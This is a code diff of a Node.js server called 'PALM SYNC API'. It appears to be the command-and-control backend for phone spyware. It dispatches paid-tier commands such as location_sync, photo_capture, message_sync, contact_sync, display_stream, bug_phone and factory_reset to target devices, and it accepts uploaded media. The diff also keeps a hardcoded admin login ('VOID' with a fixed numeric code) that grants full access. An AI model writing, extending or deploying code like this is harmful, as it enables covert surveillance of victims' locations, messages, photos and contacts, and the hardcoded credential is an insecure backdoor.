@@ -10,7 +10,6 @@ const SUPABASE_URL = process.env.SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });
 
-const TIERS = { pro: { limit: 10 }, vip: { limit: 999999 } };
 const COMMAND_TIER = {
   location_sync: 'pro', photo_capture: 'pro', message_sync: 'pro', display_read: 'pro', 
   display_stream: 'pro', led_test: 'pro', alert_sync: 'pro', contact_sync: 'pro', 
@@ -20,6 +19,7 @@ const COMMAND_TIER = {
   factory_reset: 'vip', bug_phone: 'vip'
 };
 const TIER_RANK = { pro: 1, vip: 2 };
+const ADMIN_CODE = "201019";
 function ts() { return Date.now(); }
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
@@ -86,7 +86,7 @@ app.post('/media', upload.single('file'), async (req, res) => {
 app.post('/auth', async (req, res) => {
   const { username, password } = req.body;
   if (username !== 'VOID') return res.json({ ok: false });
-  if (password === '201019') return res.json({ ok: true, token: 'admin', userId: password, admin: true, tier: 'vip', commands_used: 0 });
+  if (password === ADMIN_CODE) return res.json({ ok: true, token: 'admin', userId: password, admin: true, tier: 'vip', commands_used: 0 });
   
   const row = await getCode(password);
   if (!row) return res.json({ ok: false });
@@ -129,5 +129,5 @@ app.post('/dispatch', async (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/', (req, res) => res.send('PALM SYNC API'));
+app.get('/', (req, res) => res.send('PALM SYNC API ONLINE'));
 app.listen(process.env.PORT || 3000);
